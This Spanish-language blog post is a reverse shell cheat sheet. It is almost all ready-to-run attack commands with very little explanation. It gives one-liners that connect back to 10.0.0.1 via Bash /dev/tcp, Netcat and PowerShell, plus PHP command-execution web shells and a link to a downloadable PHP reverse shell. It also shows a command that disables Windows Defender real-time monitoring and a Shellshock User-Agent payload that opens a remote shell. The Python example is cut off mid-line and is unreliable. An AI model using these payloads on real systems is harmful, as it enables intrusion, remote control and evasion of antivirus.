---
date: 2021-09-15T00:22:05.000Z
layout: post
comments: true
title: Reverse Shell
subtitle: 'y como obtener acceso'
description: >-
image: >-
  http://imgfz.com/i/8lyF7VZ.jpeg
optimized_image: >-
  http://imgfz.com/i/8lyF7VZ.jpeg
category: ciberseguridad
tags:
  - explotación
  - linux
  - hacking
author: Felipe Canales Cayuqueo
paginate: true
---
# Ejemplos principales:
### Bash
```bash
┌─[root@kali]─[/home/user/demo/exploit]
└──╼ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```
### Python
```bash
┌─[root@kali]─[/home/user/demo/exploit]
└──╼ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234))
```
### Netcat
```bash
#Versiones actualizadas
┌─[root@kali]─[/home/user/demo/exploit]
└──╼ nc -e /bin/sh 10.0.0.1 1234

#Versiones más antiguas
┌─[root@kali]─[/home/user/demo/exploit]
└──╼ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

### PHP
En PHP se puede ingresar un archivo malicioso que devuelva una reverse shell.

>[Descarga archivo aquí](http://www.mediafire.com/file/a3i5v7urr7cp6gw/php-reverse-shell-1.0.tar.gz/file)

Para testear ejecución remota de comandos:

```php
<?php system($_GET[‘ls’]);?>

## <?php system($_GET[‘cmd’]);?>
```


### PowerShell (cmd)

```
C:\Users\test> powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### Deshabilitar Antivirus

```powershell
PS C:\Users\test> Set-MpPreference -DisableRealtimeMonitoring $true
```

### Ejemplo de uso
En burpsuite se podría ocupar en ataques como Shellshock, por ejemplo:
```bash
#Se ocupa como base un proceso como este...
curl -H "User-Agent: () { :; }; /bin/eject" http://example.com/
```
```bash
#Acá se adapta el proceso...
User Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
```
